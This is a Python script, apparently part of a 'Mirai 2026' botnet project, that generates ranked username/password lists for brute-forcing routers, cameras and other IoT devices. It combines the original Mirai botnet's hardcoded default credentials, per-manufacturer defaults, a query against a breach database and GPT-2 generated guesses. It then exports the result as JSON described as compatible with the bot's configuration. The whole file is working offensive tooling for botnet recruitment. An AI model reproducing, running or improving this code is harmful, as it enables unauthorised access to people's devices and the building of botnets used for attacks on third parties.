#!/usr/bin/env python3
"""
Mirai 2026 - AI-Powered Credential Intelligence Generator

Uses LLMs to generate optimized credential lists based on:
- Breach database analysis
- Device type fingerprinting
- Historical success patterns
- Manufacturer-specific defaults
"""

import argparse
import json
import sqlite3
from dataclasses import dataclass
from typing import List, Dict, Optional
import sys

try:
    import sys
    import os
    # Add parent directory to path for imports
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
    from llm_integration.llm_client import LLMClient, LLMConfig, LLMProvider
    LLM_AVAILABLE = True
except ImportError:
    LLM_AVAILABLE = False
    print("Warning: LLM integration not available, using fallback mode")

try:
    from transformers import pipeline  # For local LLM
except ImportError:
    pipeline = None


@dataclass
class Credential:
    """Credential entry with metadata"""
    username: str
    password: str
    weight: int
    source: str = "ai_generated"
    confidence: float = 0.0
    device_types: List[str] = None


class CredentialIntelligence:
    """AI-powered credential intelligence system"""
    
    def __init__(self, breach_db_path: Optional[str] = None, use_local_llm: bool = True):
        self.breach_db_path = breach_db_path
        self.use_local_llm = use_local_llm
        self.credentials = []
        
        if use_local_llm and pipeline:
            print("Loading local LLM for credential generation...")
            self.llm = pipeline("text-generation", model="gpt2")
        else:
            self.llm = None
    
    def load_breach_database(self) -> List[Credential]:
        """Load credentials from breach database"""
        if not self.breach_db_path:
            return []
        
        print(f"Loading breach database: {self.breach_db_path}")
        
        try:
            conn = sqlite3.connect(self.breach_db_path)
            cursor = conn.cursor()
            
            # Query most common credentials
            cursor.execute("""
                SELECT username, password, COUNT(*) as freq
                FROM credentials
                WHERE device_type = 'iot' OR device_type = 'router'
                GROUP BY username, password
                ORDER BY freq DESC
                LIMIT 100
            """)
            
            credentials = []
            for row in cursor.fetchall():
                username, password, freq = row
                credentials.append(Credential(
                    username=username,
                    password=password,
                    weight=min(freq // 100, 10),  # Normalize weight
                    source="breach_db",
                    confidence=0.9
                ))
            
            conn.close()
            print(f"Loaded {len(credentials)} credentials from breach database")
            return credentials
            
        except Exception as e:
            print(f"Error loading breach database: {e}")
            return []
    
    def generate_manufacturer_defaults(self, manufacturer: str) -> List[Credential]:
        """Generate credentials for specific manufacturer"""
        
        # Common manufacturer patterns (can be enhanced with LLM)
        manufacturer_patterns = {
            "tp-link": [
                ("admin", "admin"),
                ("admin", "password"),
            ],
            "netgear": [
                ("admin", "password"),
                ("admin", "1234"),
            ],
            "linksys": [
                ("admin", "admin"),
                ("", "admin"),
            ],
            "dlink": [
                ("admin", ""),
                ("admin", "admin"),
            ],
            "asus": [
                ("admin", "admin"),
                ("admin", "password"),
            ],
            "default": [
                ("root", "admin"),
                ("admin", "admin"),
                ("root", "password"),
                ("admin", "password"),
            ]
        }
        
        patterns = manufacturer_patterns.get(manufacturer.lower(), 
                                            manufacturer_patterns["default"])
        
        credentials = []
        for username, password in patterns:
            credentials.append(Credential(
                username=username,
                password=password,
                weight=5,
                source=f"manufacturer_{manufacturer}",
                confidence=0.7,
                device_types=[manufacturer]
            ))
        
        return credentials
    
    def generate_with_llm(self, target_type: str, count: int = 20) -> List[Credential]:
        """Use LLM to generate credential predictions"""
        
        if not self.llm:
            print("LLM not available, skipping AI generation")
            return []
        
        prompt = f"""Generate the most likely default credentials for {target_type} devices.
        Format: username:password (one per line)
        Common patterns for IoT devices, routers, and cameras.
        Top {count} most probable:"""
        
        try:
            # This is a simple example - production would use more sophisticated prompting
            result = self.llm(prompt, max_length=200, num_return_sequences=1)
            
            # Parse the output (simplified)
            credentials = []
            lines = result[0]['generated_text'].split('\n')
            
            for line in lines:
                if ':' in line:
                    parts = line.strip().split(':')
                    if len(parts) == 2:
                        username, password = parts
                        credentials.append(Credential(
                            username=username.strip(),
                            password=password.strip(),
                            weight=3,
                            source="llm_generated",
                            confidence=0.5,
                            device_types=[target_type]
                        ))
            
            print(f"Generated {len(credentials)} credentials using LLM")
            return credentials
            
        except Exception as e:
            print(f"Error generating with LLM: {e}")
            return []
    
    def get_baseline_credentials(self) -> List[Credential]:
        """Get baseline credential set (from original Mirai)"""
        
        baseline = [
            ("root", "xc3511", 10),
            ("root", "vizxv", 9),
            ("root", "admin", 8),
            ("admin", "admin", 7),
            ("root", "888888", 6),
            ("root", "xmhdipc", 5),
            ("root", "default", 5),
            ("root", "juantech", 5),
            ("root", "123456", 5),
            ("root", "54321", 5),
            ("support", "support", 5),
            ("root", "", 4),
            ("admin", "password", 4),
            ("root", "root", 4),
            ("root", "12345", 4),
            ("user", "user", 3),
            ("admin", "", 3),
            ("root", "pass", 3),
            ("admin", "admin1234", 3),
            ("root", "1111", 3),
        ]
        
        credentials = []
        for username, password, weight in baseline:
            credentials.append(Credential(
                username=username,
                password=password,
                weight=weight,
                source="baseline",
                confidence=0.8
            ))
        
        return credentials
    
    def optimize_credential_list(self, credentials: List[Credential]) -> List[Credential]:
        """Optimize credential list by removing duplicates and ranking"""
        
        # Remove duplicates, keeping highest weight
        unique_creds = {}
        for cred in credentials:
            key = (cred.username, cred.password)
            if key not in unique_creds or cred.weight > unique_creds[key].weight:
                unique_creds[key] = cred
        
        # Sort by weight and confidence
        sorted_creds = sorted(unique_creds.values(), 
                            key=lambda c: (c.weight, c.confidence), 
                            reverse=True)
        
        return sorted_creds
    
    def generate(self, target_type: str = "router", 
                 manufacturer: Optional[str] = None,
                 use_ai: bool = True) -> List[Credential]:
        """Generate comprehensive credential list"""
        
        print(f"Generating credentials for: {target_type}")
        
        all_credentials = []
        
        # 1. Baseline credentials
        all_credentials.extend(self.get_baseline_credentials())
        
        # 2. Breach database
        if self.breach_db_path:
            all_credentials.extend(self.load_breach_database())
        
        # 3. Manufacturer-specific
        if manufacturer:
            all_credentials.extend(self.generate_manufacturer_defaults(manufacturer))
        
        # 4. AI-generated
        if use_ai and self.llm:
            all_credentials.extend(self.generate_with_llm(target_type))
        
        # Optimize and return
        optimized = self.optimize_credential_list(all_credentials)
        print(f"Generated {len(optimized)} unique credentials")
        
        return optimized
    
    def export_to_json(self, credentials: List[Credential], output_path: str):
        """Export credentials to JSON format compatible with bot config"""
        
        config = {
            "credentials": {
                "list": [
                    {
                        "username": cred.username,
                        "password": cred.password,
                        "weight": cred.weight,
                        "metadata": {
                            "source": cred.source,
                            "confidence": cred.confidence,
                            "device_types": cred.device_types or []
                        }
                    }
                    for cred in credentials
                ],
                "ai_generation_enabled": True,
                "generated_at": "2026-02-24T04:00:00Z"
            }
        }
        
        with open(output_path, 'w') as f:
            json.dump(config, f, indent=2)
        
        print(f"Exported credentials to: {output_path}")


def main():
    parser = argparse.ArgumentParser(
        description="AI-Powered Credential Intelligence Generator"
    )
    parser.add_argument("--breach-db", help="Path to breach database (SQLite)")
    parser.add_argument("--target-type", default="router", 
                       help="Target device type (router, camera, iot)")
    parser.add_argument("--manufacturer", help="Specific manufacturer")
    parser.add_argument("--output", default="credentials.json",
                       help="Output JSON file")
    parser.add_argument("--no-ai", action="store_true",
                       help="Disable AI generation")
    parser.add_argument("--local-llm", action="store_true", default=True,
                       help="Use local LLM instead of API")
    
    args = parser.parse_args()
    
    # Initialize generator
    generator = CredentialIntelligence(
        breach_db_path=args.breach_db,
        use_local_llm=args.local_llm
    )
    
    # Generate credentials
    credentials = generator.generate(
        target_type=args.target_type,
        manufacturer=args.manufacturer,
        use_ai=not args.no_ai
    )
    
    # Export
    generator.export_to_json(credentials, args.output)
    
    print(f"\n✓ Success! Generated {len(credentials)} credentials")
    print(f"  Output: {args.output}")
    print(f"  Target: {args.target_type}")
    if args.manufacturer:
        print(f"  Manufacturer: {args.manufacturer}")


if __name__ == "__main__":
    main()
